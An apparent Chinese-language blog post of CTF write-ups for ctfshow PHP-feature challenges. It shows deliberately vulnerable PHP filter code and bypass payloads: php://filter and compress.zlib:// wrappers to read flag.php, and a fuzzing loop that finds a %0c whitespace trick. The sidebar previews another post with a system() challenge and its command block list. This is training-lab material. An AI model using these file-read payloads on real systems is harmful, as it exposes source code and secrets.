+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($file)&#123;   if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;     die(&#x27;hacker!&#x27;);   &#125;else&#123;     return $file;   &#125; &#125; $file=$_GET[&#x27;file&#x27;]; if(! is_file($file))&#123;   highlight_file(filter($file)); &#125;else&#123;   echo &quot;hacker!&quot;; &#125;</span><br></pre></td></tr></table></figure>
+
+一看的话可能是伪协议；没有过滤封装协议；可以进行：?file=compress.zlib://flag.php
+
+114：
+
+`function filter($file){   if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){     die('hacker!');   }else{     return $file;   } } $file=$_GET['file']; echo "师傅们居然tql都是非预期 哼！"; if(! is_file($file)){   highlight_file(filter($file)); }else{   echo "hacker!"; } `师傅们居然tql都是非预期 哼！
+
+没有过滤filter;
+
+?file=php://filter/resource=flag.php;
+
+115:
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($num)&#123;   $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);   return $num; &#125; $num=$_GET[&#x27;num&#x27;]; if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;   if($num==&#x27;36&#x27;)&#123;     echo $flag;   &#125;else&#123;     echo &quot;hacker!!&quot;;   &#125; &#125;else&#123;   echo &quot;hacker!!!&quot;;</span><br></pre></td></tr></table></figure>
+
+1:进行替换 2：是不是整数 3：不=36 4：trim函数去除俩边空白符，但是没有过滤\f   5:filter(num)=36
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">for ($i = 0; $i &lt; 129; $i++) &#123;</span><br><span class="line">    $num = chr($i) . &#x27;36&#x27;;</span><br><span class="line">    if (trim($num) !== &#x27;36&#x27; &amp;&amp; is_numeric($num) &amp;&amp; $num !== &#x27;36&#x27;) &#123;</span><br><span class="line">        echo urlencode(chr($i)) . &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+进行测试；?num=%0c36
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Wea5e1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/">http://example.com/2025/03/16/ctfshow中php特性上/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Wea5e1-BLOG</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/6.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/money.jpg" target="_blank"><img class="post-qr-code-img" src="/img/money.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/16/isctf2024web/" title="isctf2024web"><img class="cover" src="/img/2.jpg" onerror="onerror=null;src='/img/4040.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">isctf2024web</div></div><div class="info-2"><div class="info-item-1">ISCTF2024：1z_php:if(isset($_POST[&#x27;J&#x27;]))&#123;  $call=$_POST[&#x27;J&#x27;];  $dangerous_commands = [&#x27;cat&#x27;, &#x27;tac&#x27;, &#x27;head&#x27;, &#x27;nl&#x27;, &#x27;more&#x27;, &#x27;less&#x27;, &#x27;tail&#x27;, &#x27;vi&#x27;, &#x27;sed&#x27;, &#x27;od&#x27;];  foreach ($dangerous_commands as $command) &#123;    if (preg_match(&quot;/$command/i&quot;, $call)) &#123;      die(&quot;这些个危险函数可不兴使啊&quot;);    &#125;  &#125;  system($call);&#125;?&gt;  J&#x3D;ls &#x2F;  ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicons.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Wea5e1</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=3522700034&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:3522700034@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/" title="ctfshow中php特性上"><img src="/img/6.jpg" onerror="this.onerror=null;this.src='/img/4040.jpg'" alt="ctfshow中php特性上"/></a><div class="content"><a class="title" href="/2025/03/16/ctfshow%E4%B8%ADphp%E7%89%B9%E6%80%A7%E4%B8%8A/" title="ctfshow中php特性上">ctfshow中php特性上</a><time datetime="2025-03-16T13:18:40.000Z" title="发表于 2025-03-16 21:18:40">2025-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/16/isctf2024web/" title="isctf2024web"><img src="/img/2.jpg" onerror="this.onerror=null;this.src='/img/4040.jpg'" alt="isctf2024web"/></a><div class="content"><a class="title" href="/2025/03/16/isctf2024web/" title="isctf2024web">isctf2024web</a><time datetime="2025-03-16T11:29:46.000Z" title="发表于 2025-03-16 19:29:46">2025-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/16/emojictfweb/" title="emojictfweb"><img src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/4040.jpg'" alt="emojictfweb"/></a><div class="content"><a class="title" href="/2025/03/16/emojictfweb/" title="emojictfweb">emojictfweb</a><time datetime="2025-03-16T09:32:25.000Z" title="发表于 2025-03-16 17:32:25">2025-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/05/SHOWRCE/" title="SHOWRCE"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/4040.jpg'" alt="SHOWRCE"/></a><div class="content"><a class="title" href="/2025/03/05/SHOWRCE/" title="SHOWRCE">SHOWRCE</a><time datetime="2025-03-05T12:56:28.000Z" title="发表于 2025-03-05 20:56:28">2025-03-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/02/RCE/" title="RCE"><img src="/img/6.jpg" onerror="this.onerror=null;this.src='/img/4040.jpg'" alt="RCE"/></a><div class="content"><a class="title" href="/2025/03/02/RCE/" title="RCE">RCE</a><time datetime="2025-03-02T06:42:07.000Z" title="发表于 2025-03-02 14:42:07">2025-03-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Wea5e1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.3</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
